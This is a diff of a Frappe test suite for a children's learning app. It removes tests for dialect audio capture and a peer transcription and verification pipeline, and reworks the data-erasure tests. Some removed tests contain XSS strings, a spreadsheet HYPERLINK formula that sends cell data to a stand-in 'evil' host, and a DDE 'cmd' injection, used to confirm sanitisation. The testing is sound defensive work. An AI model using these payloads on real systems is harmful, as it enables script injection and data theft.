@@ -3,7 +3,6 @@
 """Contract + validation tests for the public API. Run with:
     bench --site <site> run-tests --app hikmat
 """
-import os
 import time
 
 import frappe
@@ -704,413 +703,14 @@ class TestLessonReply(FrappeTestCase):
 		self.assertEqual(r["slots"], [])   # malformed spec → empty slots; game skips the round
 
 
-class TestDialectCapture(FrappeTestCase):
-	"""Dialect capture (Speak & Write): _save_dialect_capture hardening, private-File
-	audio storage, prompt Link resolution, curriculum export. Mirrors the
-	explicit-cleanup style — nothing test-made may survive into the live DB."""
-
-	WAV = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32   # tiny fake clip; content is opaque to the server
-
-	def _mk_student(self, name):
-		def _rm():
-			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				clips = frappe.get_all("Dialect Capture", filters={"student": s}, pluck="name")
-				for cap in clips:                        # Files point at the captures — remove first
-					frappe.db.delete("File", {"attached_to_doctype": "Dialect Capture",
-					                          "attached_to_name": cap})
-				if clips:
-					frappe.db.delete("Boli Verification", {"clip": ["in", clips]})
-					frappe.db.delete("Boli Transcription", {"clip": ["in", clips]})
-					frappe.db.delete("Boli XP Ledger", {"clip": ["in", clips]})
-				frappe.db.delete("Boli Verification", {"verifier": s})
-				frappe.db.delete("Boli Transcription", {"author": s})
-				frappe.db.delete("Boli XP Ledger", {"student": s})
-				frappe.db.delete("Boli Speaker", {"student": s})
-				frappe.db.sql("update `tabDialect Capture` set claimed_by=null, "
-				              "claim_expires=null where claimed_by=%s", s)
-				frappe.db.delete("Dialect Capture", {"student": s})
-				frappe.db.delete("Student", {"name": s})
-			frappe.db.commit()
-		self.addCleanup(_rm)
-		return frappe.get_doc({"doctype": "Student", "student_name": name,
-		                       "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
-
-	def _mk_lesson_with_prompt(self, key):
-		def _rm():
-			frappe.db.delete("Dialect Prompt", {"lesson": key + "-l1"})
-			frappe.db.delete("Lesson", {"track": key})
-			frappe.db.delete("Track", {"name": key})
-			frappe.db.commit()
-			api.clear_content_cache()
-		self.addCleanup(_rm)
-		if frappe.db.exists("Track", key):
-			frappe.delete_doc("Track", key, force=1, ignore_permissions=True)
-		track = frappe.get_doc({"doctype": "Track", "track_key": key, "title": "DC Track",
-		                        "published": 1}).insert(ignore_permissions=True)
-		lesson = frappe.get_doc({"doctype": "Lesson", "track": track.name, "lesson_key": "l1",
-		                         "title": "L1", "published": 1}).insert(ignore_permissions=True)
-		prompt = frappe.get_doc({"doctype": "Dialect Prompt", "lesson": lesson.name,
-		                         "prompt_key": "cap1", "prompt_text_hi": "तुम कहाँ जा रही हो?",
-		                         "prompt_text_en": "Where are you going?",
-		                         "category": "questions", "complexity_tier": 3,
-		                         "sort_order": 0}).insert(ignore_permissions=True)
-		return track, lesson, prompt
-
-	def test_save_capture_stores_doc_and_private_file(self):
-		stu = self._mk_student("Cap Happy Girl")
-		tok = api._token_for(stu.name)
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              track="t1", lesson="l1", prompt_key="cap1",
-		                              prompt_text_hi="तुम कहाँ जा रही हो?",
-		                              transcription="हम कहाँ जाइत बानी",
-		                              duration_secs=12, client_id="t-cap-1")
-		self.assertTrue(r.get("ok"))
-		doc = frappe.get_doc("Dialect Capture", r["id"])
-		self.assertEqual(doc.student, stu.name)
-		self.assertEqual(doc.student_name, "Cap Happy Girl")
-		self.assertEqual(doc.dialect_transcription, "हम कहाँ जाइत बानी")
-		self.assertEqual(doc.duration_secs, 12)
-		f = frappe.get_doc("File", {"attached_to_doctype": "Dialect Capture",
-		                            "attached_to_name": doc.name})
-		self.assertEqual(f.is_private, 1)            # a child's voice never lands in /files
-		self.assertTrue(doc.audio_file)
-		self.assertEqual(doc.audio_file, f.file_url)
-		self.assertTrue(doc.audio_file.startswith("/private/files/"))
-
-	def test_save_capture_dedups_client_id(self):
-		stu = self._mk_student("Cap Dedup Girl")
-		tok = api._token_for(stu.name)
-		kw = dict(student=stu.name, token=tok, track="t1", lesson="l1",
-		          transcription="दू बेर ना", client_id="t-cap-d1")
-		r1 = api._save_dialect_capture(self.WAV, "audio/wav", **kw)
-		self.assertTrue(r1.get("ok"))
-		r2 = api._save_dialect_capture(self.WAV, "audio/wav", **kw)
-		self.assertTrue(r2.get("dedup"))
-		self.assertEqual(frappe.db.count("Dialect Capture", {"client_id": "t-cap-d1"}), 1)
-
-	def test_save_capture_rejects_missing_or_oversize_audio(self):
-		stu = self._mk_student("Cap Audio Girl")
-		tok = api._token_for(stu.name)
-		r = api._save_dialect_capture(None, None, student=stu.name, token=tok,
-		                              transcription="कुछ")
-		self.assertEqual(r.get("error"), "bad_audio")
-		big = b"\x00" * (8 * 1024 * 1024 + 1)
-		r = api._save_dialect_capture(big, "audio/wav", student=stu.name, token=tok,
-		                              transcription="कुछ")
-		self.assertEqual(r.get("error"), "bad_audio")
-
-	def test_save_capture_allows_blank_transcription_now(self):
-		# Boli moved transcription OUT of recording (stage 2 is a different student), so a
-		# blank transcription no longer fails — the clip is stored at status=recorded.
-		stu = self._mk_student("Cap Text Girl")
-		tok = api._token_for(stu.name)
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              transcription="", client_id="t-cap-blank")
-		self.assertTrue(r.get("ok"))
-		row = frappe.db.get_value("Dialect Capture", {"client_id": "t-cap-blank"},
-		                          ["status", "dialect_transcription"], as_dict=True)
-		self.assertEqual(row.status, "recorded")
-		self.assertIn(row.dialect_transcription, (None, ""))
-
-	def test_save_capture_rejects_unknown_student_and_bad_token(self):
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student="nope-xyz",
-		                              transcription="कुछ")
-		self.assertEqual(r.get("error"), "unknown_student")
-		stu = self._mk_student("Cap Auth Girl")
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name,
-		                              token="forged", transcription="कुछ")
-		self.assertEqual(r.get("error"), "auth")
-
-	def test_save_capture_clamps_duration_and_transcription(self):
-		stu = self._mk_student("Cap Clamp Girl")
-		tok = api._token_for(stu.name)
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              track="t1", lesson="l1",
-		                              transcription="ब" * 3000, duration_secs=999999,
-		                              client_id="t-cap-c1")
-		self.assertTrue(r.get("ok"))
-		row = frappe.db.get_value("Dialect Capture", {"client_id": "t-cap-c1"},
-		                          ["duration_secs", "dialect_transcription"], as_dict=True)
-		self.assertEqual(row.duration_secs, 600)     # nothing outlives the 3-min recorder by much
-		self.assertEqual(len(row.dialect_transcription), 2000)
-
-	def test_save_capture_resolves_prompt_link(self):
-		_track, _lesson, prompt = self._mk_lesson_with_prompt("dc-cap-t1")
-		stu = self._mk_student("Cap Link Girl")
-		tok = api._token_for(stu.name)
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              track="dc-cap-t1", lesson="l1", prompt_key="cap1",
-		                              prompt_text_hi="तुम कहाँ जा रही हो?",
-		                              transcription="तूं कहाँ जात बाड़ू", client_id="t-cap-l1")
-		self.assertTrue(r.get("ok"))
-		row = frappe.db.get_value("Dialect Capture", {"client_id": "t-cap-l1"},
-		                          ["prompt", "prompt_text_hi"], as_dict=True)
-		self.assertEqual(row.prompt, prompt.name)
-		# a dangling key never fails the write — the denormalized text still lands
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              track="dc-cap-t1", lesson="l1", prompt_key="gone9",
-		                              prompt_text_hi="मिट गया प्रश्न",
-		                              transcription="फिर भी बोलनी", client_id="t-cap-l2")
-		self.assertTrue(r.get("ok"))
-		row = frappe.db.get_value("Dialect Capture", {"client_id": "t-cap-l2"},
-		                          ["prompt", "prompt_text_hi"], as_dict=True)
-		self.assertFalse(row.prompt)
-		self.assertEqual(row.prompt_text_hi, "मिट गया प्रश्न")
-
-	def test_save_capture_ignores_client_prompt_text_when_linked(self):
-		# The client's prompt_text_hi is student-controlled text that lands in the
-		# facilitator's Desk queue. When the authored prompt resolves, IT is the truth.
-		_track, _lesson, prompt = self._mk_lesson_with_prompt("dc-cap-x1")
-		stu = self._mk_student("Cap Markup Girl")
-		tok = api._token_for(stu.name)
-		evil = '"<img src=x onerror=alert(1)>"'   # quoted → frappe's sanitize_html sees JSON and skips
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              track="dc-cap-x1", lesson="l1", prompt_key="cap1",
-		                              prompt_text_hi=evil, category=evil, device_id=evil,
-		                              client_id="t-cap-x1")
-		self.assertTrue(r.get("ok"))
-		row = frappe.db.get_value("Dialect Capture", {"client_id": "t-cap-x1"},
-		                          ["prompt_text_hi", "category", "device_id"], as_dict=True)
-		self.assertEqual(row.prompt_text_hi, prompt.prompt_text_hi)
-		for v in (row.prompt_text_hi, row.category, row.device_id):
-			self.assertNotIn("<", v)             # nothing left that can open a tag
-			self.assertNotIn(">", v)
-
-	def test_save_capture_strips_markup_from_unlinked_prompt_text(self):
-		# No authored prompt to fall back on: her words are kept, the markup is not. Stripped
-		# and NOT escaped — the game renders this text through esc(), so a stored "&lt;" would
-		# show the girl the entity itself.
-		stu = self._mk_student("Cap Free Girl")
-		tok = api._token_for(stu.name)
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu.name, token=tok,
-		                              prompt_text_hi="<script>bad()</script> आज हम खेत गइनी",
-		                              transcription="<b>माई</b> कहलस", client_id="t-cap-x2")
-		self.assertTrue(r.get("ok"))
-		row = frappe.db.get_value("Dialect Capture", {"client_id": "t-cap-x2"},
-		                          ["prompt_text_hi", "dialect_transcription"], as_dict=True)
-		self.assertNotIn("<", row.prompt_text_hi)
-		self.assertNotIn("&lt;", row.prompt_text_hi)
-		self.assertIn("आज हम खेत गइनी", row.prompt_text_hi)
-		self.assertEqual(row.dialect_transcription, "माई कहलस")
-
-	def test_track_json_exports_capture_prompts(self):
-		self._mk_lesson_with_prompt("dc-cap-exp")
-		api.clear_content_cache()
-		t = next(c for c in api._build_courses() if c["key"] == "dc-cap-exp")
-		les = t["lessons"][0]
-		self.assertEqual(les["capture"], [{"key": "cap1", "hi": "तुम कहाँ जा रही हो?",
-		                                   "en": "Where are you going?",
-		                                   "category": "questions", "tier": 3}])
-
-
-def _ledger_points(student, event):
-	"""Total Boli XP points a student earned for one event kind."""
-	return sum(frappe.get_all("Boli XP Ledger", filters={"student": student, "event": event},
-	                          pluck="points"))
-
-
-class TestBoliPipeline(FrappeTestCase):
-	"""Boli stages 2–3: transcribe → 2-accept verify, cross-student queue leasing, the
-	rework→escalate loop, server-authoritative XP + dedup, and the v7 legacy migration.
-	The pipeline commits, so (like TestDialectCapture) every fixture is cleaned explicitly."""
-
-	WAV = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
-
-	def _mk_student(self, name):
-		def _rm():
-			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				clips = frappe.get_all("Dialect Capture", filters={"student": s}, pluck="name")
-				for cap in clips:
-					frappe.db.delete("File", {"attached_to_doctype": "Dialect Capture",
-					                          "attached_to_name": cap})
-				if clips:
-					frappe.db.delete("Boli Verification", {"clip": ["in", clips]})
-					frappe.db.delete("Boli Transcription", {"clip": ["in", clips]})
-					frappe.db.delete("Boli XP Ledger", {"clip": ["in", clips]})
-				frappe.db.delete("Boli Verification", {"verifier": s})
-				frappe.db.delete("Boli Transcription", {"author": s})
-				frappe.db.delete("Boli XP Ledger", {"student": s})
-				frappe.db.delete("Boli Speaker", {"student": s})
-				frappe.db.sql("update `tabDialect Capture` set claimed_by=null, "
-				              "claim_expires=null where claimed_by=%s", s)
-				frappe.db.delete("Dialect Capture", {"student": s})
-				frappe.db.delete("Student", {"name": s})
-			frappe.db.commit()
-		self.addCleanup(_rm)
-		doc = frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
-		                      "gender": "Female", "age": 15}).insert(ignore_permissions=True)
-		return doc, api._token_for(doc.name)
-
-	def _record(self, student, token, cid):
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=student, token=token,
-		                              track="boli-t", lesson="l1", prompt_text_hi="कहाँ?",
-		                              duration_secs=30, client_id=cid)
-		self.assertTrue(r.get("ok"), r)
-		return r["id"]
-
-	def test_transcribe_two_accepts_verifies_and_pays(self):
-		rec, rtok = self._mk_student("Boli Rec A")
-		txr, ttok = self._mk_student("Boli Txr A")
-		v1, v1tok = self._mk_student("Boli Ver A1")
-		v2, v2tok = self._mk_student("Boli Ver A2")
-		clip = self._record(rec.name, rtok, "b-rec-a")
-
-		r = api.submit_transcription(student=txr.name, token=ttok, clip=clip,
-		                             text="कहाँ जात बाड़ू", client_id="b-tx-a")
-		self.assertTrue(r.get("ok"), r)
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "status"), "in_verification")
-
-		r = api.submit_verification(student=v1.name, token=v1tok, clip=clip,
-		                            verdict="accept", client_id="b-vf-a1")
-		self.assertTrue(r.get("ok"))
-		self.assertFalse(r.get("verified"))               # one accept is not enough
-		r = api.submit_verification(student=v2.name, token=v2tok, clip=clip,
-		                            verdict="accept", client_id="b-vf-a2")
-		self.assertTrue(r.get("verified"))
-
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "status"), "verified")
-		self.assertEqual(_ledger_points(txr.name, "transcription_verified"), 20)
-		self.assertEqual(_ledger_points(rec.name, "recorded"), 5)
-		self.assertEqual(_ledger_points(rec.name, "speaker_credit"), 10)   # self recording
-		self.assertEqual(_ledger_points(v1.name, "verification_match"), 5)
-		self.assertEqual(_ledger_points(v2.name, "verification_match"), 5)
-		self.assertEqual(api._total_gems(txr.name), 20)   # gems fold in the Boli ledger
-
-	def test_dedup_does_not_double_pay(self):
-		rec, rtok = self._mk_student("Boli Rec B")
-		txr, ttok = self._mk_student("Boli Txr B")
-		v1, v1tok = self._mk_student("Boli Ver B1")
-		v2, v2tok = self._mk_student("Boli Ver B2")
-		clip = self._record(rec.name, rtok, "b-rec-b")
-		api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="ठीक बा",
-		                         client_id="b-tx-b")
-		api.submit_verification(student=v1.name, token=v1tok, clip=clip, verdict="accept",
-		                        client_id="b-vf-b1")
-		api.submit_verification(student=v2.name, token=v2tok, clip=clip, verdict="accept",
-		                        client_id="b-vf-b2")
-		# a retried accept (same client_id) must not add a second vote or re-pay
-		r = api.submit_verification(student=v2.name, token=v2tok, clip=clip, verdict="accept",
-		                            client_id="b-vf-b2")
-		self.assertTrue(r.get("dedup"))
-		self.assertEqual(frappe.db.count("Boli XP Ledger",
-		                                 {"student": txr.name, "event": "transcription_verified"}), 1)
-
-	def test_cannot_touch_own_clip_or_transcription(self):
-		rec, rtok = self._mk_student("Boli Rec C")
-		txr, ttok = self._mk_student("Boli Txr C")
-		clip = self._record(rec.name, rtok, "b-rec-c")
-		r = api.submit_transcription(student=rec.name, token=rtok, clip=clip, text="x",
-		                             client_id="b-tx-c0")
-		self.assertEqual(r.get("error"), "own_clip")       # can't transcribe your own recording
-		api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="अपना",
-		                         client_id="b-tx-c1")
-		r = api.submit_verification(student=rec.name, token=rtok, clip=clip, verdict="accept",
-		                            client_id="b-vf-c0")
-		self.assertEqual(r.get("error"), "own_clip")       # can't verify your own recording
-		r = api.submit_verification(student=txr.name, token=ttok, clip=clip, verdict="accept",
-		                            client_id="b-vf-c1")
-		self.assertEqual(r.get("error"), "own_transcription")   # nor what you wrote
-
-	def test_queue_excludes_own_and_leases_transcribe(self):
-		rec, rtok = self._mk_student("Boli Rec D")
-		txr, ttok = self._mk_student("Boli Txr D")
-		tx2, t2tok = self._mk_student("Boli Txr D2")
-		clip = self._record(rec.name, rtok, "b-rec-d")
-		q = api.get_boli_queue(student=rec.name, token=rtok, kind="transcribe", batch=50)
-		self.assertNotIn(clip, [i["clip"] for i in q["items"]])   # never her own clip
-		q = api.get_boli_queue(student=txr.name, token=ttok, kind="transcribe", batch=50)
-		self.assertIn(clip, [i["clip"] for i in q["items"]])
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "claimed_by"), txr.name)
-		q = api.get_boli_queue(student=tx2.name, token=t2tok, kind="transcribe", batch=50)
-		self.assertNotIn(clip, [i["clip"] for i in q["items"]])   # live-leased → hidden
-
-	def test_reject_reworks_then_escalates(self):
-		rec, rtok = self._mk_student("Boli Rec E")
-		txr, ttok = self._mk_student("Boli Txr E")
-		vr, vtok = self._mk_student("Boli Ver E")
-		clip = self._record(rec.name, rtok, "b-rec-e")
-		for i in range(2):                                 # two reject rounds re-open the clip
-			api.submit_transcription(student=txr.name, token=ttok, clip=clip,
-			                         text="कोशिश %d" % i, client_id="b-tx-e%d" % i)
-			r = api.submit_verification(student=vr.name, token=vtok, clip=clip, verdict="reject",
-			                            reason="wrong_words", client_id="b-vf-e%d" % i)
-			self.assertTrue(r.get("rework"), r)
-			self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "status"), "recorded")
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "rework_rounds"), 2)
-		api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="आखिरी",
-		                         client_id="b-tx-e2")
-		r = api.submit_verification(student=vr.name, token=vtok, clip=clip, verdict="reject",
-		                            reason="bad_audio", client_id="b-vf-e2")
-		self.assertTrue(r.get("escalated"), r)             # cap reached → forced PA adjudication
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "status"), "escalated")
-
-	def test_transcription_strips_markup(self):
-		rec, rtok = self._mk_student("Boli Rec X")
-		txr, ttok = self._mk_student("Boli Txr X")
-		clip = self._record(rec.name, rtok, "b-rec-x")
-		r = api.submit_transcription(student=txr.name, token=ttok, clip=clip,
-		                             text='"<img src=x onerror=alert(1)>" माई कहलस',
-		                             client_id="b-tx-x1")
-		self.assertTrue(r.get("ok"), r)
-		text = frappe.db.get_value("Boli Transcription", r["name"], "text")
-		self.assertNotIn("<", text)
-		self.assertIn("माई कहलस", text)                    # her Devanagari is untouched
-		clip2 = self._record(rec.name, rtok, "b-rec-x2")
-		r = api.submit_transcription(student=txr.name, token=ttok, clip=clip2,
-		                             text="<b></b>", client_id="b-tx-x2")
-		self.assertEqual(r.get("error"), "bad_transcription")   # markup-only is no transcription
-
-	def test_adjudication_report_escapes_and_defuses_formulas(self):
-		# Defence in depth at the sink: rows poisoned before ingest was sanitised (or typed in
-		# Desk) must still render inert in the grid, and the PA's CSV/XLSX export must not hand
-		# her spreadsheet a formula.
-		from hikmat.hikmat.report.boli_adjudication_queue.boli_adjudication_queue import execute
-		rec, rtok = self._mk_student("Boli Rec R")
-		txr, ttok = self._mk_student("Boli Txr R")
-		clip = self._record(rec.name, rtok, "b-rec-r")
-		tx = api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="ठीक बा",
-		                              client_id="b-tx-r1")
-		frappe.db.set_value("Dialect Capture", clip,
-		                    {"status": "escalated", "student_name": "<img src=x onerror=alert(1)>",
-		                     "prompt_text_hi": '=HYPERLINK("http://evil/?"&A1,"CLICK ME")'},
-		                    update_modified=False)
-		frappe.db.set_value("Boli Transcription", tx["name"], "text", "+cmd|' /C calc'!A0",
-		                    update_modified=False)
-		frappe.db.commit()
-		row = next(r for r in execute()[1] if r["clip"] == clip)
-		self.assertNotIn("<", row["student_name"])
-		self.assertIn("&lt;img", row["student_name"])
-		self.assertTrue(row["prompt_text_hi"].startswith("'="))
-		self.assertTrue(row["transcription"].startswith("'+"))
-
-	def test_v7_migration_is_idempotent(self):
-		from hikmat.patches import v7_boli
-		rec, rtok = self._mk_student("Boli Legacy Girl")
-		clip = frappe.get_doc({"doctype": "Dialect Capture", "student": rec.name,
-		                       "student_name": rec.student_name, "status": "recorded",
-		                       "dialect_transcription": "पुराना बोली", "client_id": "b-legacy-1",
-		                       "captured_on": frappe.utils.now()}).insert(ignore_permissions=True).name
-		frappe.db.commit()
-		v7_boli._migrate_legacy_captures()
-		frappe.db.commit()
-		self.assertEqual(frappe.db.count("Boli Transcription", {"clip": clip}), 1)
-		row = frappe.db.get_value("Dialect Capture", clip,
-		                          ["status", "speaker", "speaker_relation"], as_dict=True)
-		self.assertEqual(row.status, "in_verification")
-		self.assertTrue(row.speaker)
-		self.assertEqual(row.speaker_relation, "self")
-		v7_boli._migrate_legacy_captures()                 # re-running changes nothing
-		frappe.db.commit()
-		self.assertEqual(frappe.db.count("Boli Transcription", {"clip": clip}), 1)
-
-
 class TestErasure(FrappeTestCase):
-	"""Right to erasure: a girl's voice must leave the database AND the disk, while
-	another child's recording — one she only operated, or holds a lease on — survives
-	with the reference to her cleared. Every clip gets distinct audio because Frappe
-	dedups File bytes on content_hash, so identical clips share one path."""
+	"""Right to erasure: every row keyed on a girl leaves the database, the synthetic
+	Frappe User of an online learner goes with them, and Frappe's own bookkeeping stops
+	naming her.
 
-	HEAD = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
+	The audio half of this suite went with the Bhojpuri AI / Boli pipeline. The app no
+	longer records anything, so there are no private media bytes for an erasure to reach;
+	v12_remove_boli is what erases the recordings older builds collected."""
 
 	def _mk_student(self, name, with_user=False):
 		user = None
@@ -1123,251 +723,76 @@ class TestErasure(FrappeTestCase):
 
 		def _rm():
 			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				paths = api._erase_boli_data(s)
 				for dt in api._LEARNER_DOCTYPES:
 					api._erase(dt, api._erasable(dt, {"student": s}))
 				frappe.db.set_value("Student", s, "user", None, update_modified=False)
 				frappe.delete_doc("Student", s, force=1, ignore_permissions=True,
 				                  delete_permanently=True)
 				frappe.db.commit()
-				api._erase_capture_bytes(paths)   # rows first, bytes after the commit
 			api._erase_student_user(user)
 			frappe.db.commit()
 		self.addCleanup(_rm)
 		return frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
 		                       "gender": "Female", "user": user}).insert(ignore_permissions=True)
 
-	def _record(self, stu, tail, cid, **kw):
-		r = api._save_dialect_capture(self.HEAD + tail, "audio/wav", student=stu.name,
-		                              token=api._token_for(stu.name), track="boli-t",
-		                              lesson="l1", duration_secs=9, client_id=cid, **kw)
-		self.assertTrue(r.get("ok"), r)
-		return r["id"]
-
-	def _audio_path(self, clip):
-		url = frappe.db.get_value("Dialect Capture", clip, "audio_file")
-		return os.path.join(frappe.utils.get_files_path(is_private=1), url.rsplit("/", 1)[-1])
-
-	def test_delete_student_erases_voice_rows_files_and_bytes(self):
-		girl = self._mk_student("Erase Voice Girl", with_user=True)
-		peer = self._mk_student("Erase Peer Girl")
-		mine = self._record(girl, b"E-mine", "erase-mine")
-		hers = self._record(peer, b"E-hers", "erase-hers", operator=girl.name)
-		frappe.db.set_value("Dialect Capture", hers,
-		                    {"claimed_by": girl.name, "claim_expires": frappe.utils.now()},
-		                    update_modified=False)
-		frappe.get_doc({"doctype": "Boli Transcription", "clip": hers, "author": girl.name,
-		                "text": "ओकर लिखल", "version": 1}).insert(ignore_permissions=True)
-		frappe.get_doc({"doctype": "Boli Verification", "clip": hers, "verifier": girl.name,
-		                "verdict": "accept"}).insert(ignore_permissions=True)
+	def _seed_trail(self, girl):
+		"""One row in each learner table that a plain fixture can create, so the test
+		fails if a table is ever dropped from api._LEARNER_DOCTYPES."""
+		frappe.get_doc({"doctype": "Lesson Attempt", "student": girl.name,
+		                "student_name": girl.student_name, "track": "t1", "lesson": "l1",
+		                "activity": "learn", "stars": 2, "coins": 20,
+		                "attempted_on": frappe.utils.now()}).insert(ignore_permissions=True)
+		frappe.get_doc({"doctype": "Lesson Doubt", "student": girl.name,
+		                "student_name": girl.student_name, "track": "t1", "lesson": "l1",
+		                "activity": "learn", "question": "समझ नहीं आया", "resolved": 0,
+		                "raised_on": frappe.utils.now()}).insert(ignore_permissions=True)
 		milestone = frappe.get_all("Hikmat Milestone", limit=1, pluck="name")
-		if milestone:                       # facilitator free text about the child
+		if milestone:                       # facilitator free text ABOUT the child
 			frappe.get_doc({"doctype": "Evaluation", "student": girl.name,
 			                "student_name": girl.student_name, "milestone": milestone[0],
 			                "status": "Pending", "rubric_notes": "notes about the child",
 			                }).insert(ignore_permissions=True)
 		frappe.db.commit()
-		my_audio, her_audio = self._audio_path(mine), self._audio_path(hers)
-		self.assertTrue(os.path.exists(my_audio))
+
+	def test_delete_student_erases_her_whole_trail_and_her_user(self):
+		girl = self._mk_student("Erase Rows Girl", with_user=True)
+		peer = self._mk_student("Erase Rows Peer")
+		self._seed_trail(girl)
+		self._seed_trail(peer)
 
 		self.assertTrue(api.delete_student(girl.name).get("ok"))
 
-		for dt in ("Dialect Capture", "Boli Speaker", "Boli XP Ledger", "Evaluation"):
+		for dt in api._LEARNER_DOCTYPES:
 			self.assertEqual(frappe.db.count(dt, {"student": girl.name}), 0, dt)
-		self.assertEqual(frappe.db.count("Boli Transcription", {"author": girl.name}), 0)
-		self.assertEqual(frappe.db.count("Boli Verification", {"verifier": girl.name}), 0)
-		self.assertEqual(frappe.db.count("File", {"attached_to_name": mine}), 0)
-		self.assertFalse(os.path.exists(my_audio))          # the bytes, not just the row
+		self.assertFalse(frappe.db.exists("Student", girl.name))
 		self.assertFalse(frappe.db.exists("User", girl.user))
-		# the other child's recording stays, minus every reference to the erased girl
-		self.assertTrue(frappe.db.exists("Dialect Capture", hers))
-		self.assertTrue(os.path.exists(her_audio))
-		row = frappe.db.get_value("Dialect Capture", hers,
-		                          ["operator", "claimed_by", "claim_expires"], as_dict=True)
-		self.assertFalse(row.operator)
-		self.assertFalse(row.claimed_by)                    # lease released back to the queue
-		self.assertFalse(row.claim_expires)
+		# erasing one child costs another one nothing
+		self.assertTrue(frappe.db.exists("Student", peer.name))
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": peer.name}), 1)
 
-	def test_erase_boli_data_is_rerunnable(self):
+	def test_delete_student_is_rerunnable(self):
 		girl = self._mk_student("Erase Twice Girl")
-		self._record(girl, b"E-twice", "erase-twice")
-		frappe.db.commit()
-		api._erase_boli_data(girl.name)
-		api._erase_boli_data(girl.name)                     # a retried erasure must not throw
-		self.assertEqual(frappe.db.count("Dialect Capture", {"student": girl.name}), 0)
-
-	# --- adversarial verification of the round-1 erasure code (2026-07-28) -------------
-	def _plant(self, fname, content=b"probe", age_secs=0):
-		"""A file in the private-files dir that erasure must never touch."""
-		path = os.path.join(frappe.utils.get_files_path(is_private=1), fname)
-		with open(path, "wb") as fh:
-			fh.write(content)
-		if age_secs:
-			os.utime(path, (time.time() - age_secs, time.time() - age_secs))
-		self.addCleanup(lambda: os.path.exists(path) and os.remove(path))
-		return path
-
-	def test_erasure_never_touches_bytes_it_was_not_asked_to_erase(self):
-		"""A blanket sweep of the private-files directory destroyed two planted probes on
-		one delete_student call: an untracked file, and a capture whose bytes were written
-		but whose row was not committed yet (_save_dialect_capture writes the audio inside
-		File.validate(), before its commit — so a concurrent erasure could see the bytes of
-		another girl's recording but not the row protecting them)."""
-		girl = self._mk_student("Erase Sweep Girl")
-		mine = self._record(girl, b"E-sweep", "erase-sweep")
-		frappe.db.commit()
-		my_audio = self._audio_path(mine)
-		untracked = self._plant("zz-erase-untracked-keepme.txt", b"keep me")
-		inflight = self._plant("zz-erase-inflight-upload.wav", self.HEAD + b"mid-upload")
-
+		self._seed_trail(girl)
 		self.assertTrue(api.delete_student(girl.name).get("ok"))
+		# a retried erasure must not throw; the girl is simply already gone
+		self.assertFalse(api.delete_student(girl.name).get("ok"))
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": girl.name}), 0)
 
-		self.assertFalse(os.path.exists(my_audio))           # her bytes go…
-		self.assertTrue(os.path.exists(untracked))           # …and nothing else does
-		self.assertTrue(os.path.exists(inflight))
-		with open(inflight, "rb") as fh:                     # untouched, not truncated
-			self.assertEqual(fh.read(), self.HEAD + b"mid-upload")
-
-	def test_orphan_sweep_is_opt_in_and_spares_bytes_in_flight(self):
-		"""The broad sweep still exists for the cutover wipe, but it is explicitly invoked
-		and skips anything recently modified — bytes still being written are never eligible."""
-		fresh = self._plant("zz-erase-sweep-fresh.wav", b"mid-upload")
-		aged = self._plant("zz-erase-sweep-aged.wav", b"long forgotten", age_secs=7200)
-		api._purge_orphan_capture_files()
+	def test_a_half_finished_erasure_is_resumed_not_refused(self):
+		"""An older run (or an interrupted one) can leave rows behind with the Student row
+		already gone. _erasure_residue is what lets delete_student finish that job instead
+		of answering not_found and abandoning the data forever."""
+		girl = self._mk_student("Erase Resume Girl")
+		self._seed_trail(girl)
+		frappe.delete_doc("Student", girl.name, force=1, ignore_permissions=True,
+		                  delete_permanently=True)
 		frappe.db.commit()
-		self.assertTrue(os.path.exists(fresh), "in-flight bytes must survive the sweep")
-		self.assertFalse(os.path.exists(aged), "old unclaimed bytes are the sweep's job")
+		self.assertTrue(api._erasure_residue(girl.name))
 
-	def test_identical_clips_never_share_one_file_on_disk(self):
-		"""Frappe dedups File bytes on {content_hash, is_private} and then refuses to unlink
-		while another row shares the hash, so two byte-identical clips (a muted mic gives
-		every child the same buffer) used to share ONE path: erasing girl A left her audio
-		on disk, still downloadable through girl B's clip."""
-		a = self._mk_student("Erase Dedup Girl A")
-		b = self._mk_student("Erase Dedup Girl B")
-		clip_a = self._record(a, b"", "erase-dup-a")         # byte-for-byte identical
-		clip_b = self._record(b, b"", "erase-dup-b")
-		frappe.db.commit()
-		url_a = frappe.db.get_value("Dialect Capture", clip_a, "audio_file")
-		url_b = frappe.db.get_value("Dialect Capture", clip_b, "audio_file")
-		self.assertNotEqual(url_a, url_b, "each clip must own its path")
-		path_a, path_b = self._audio_path(clip_a), self._audio_path(clip_b)
-
-		self.assertTrue(api.delete_student(a.name).get("ok"))
-
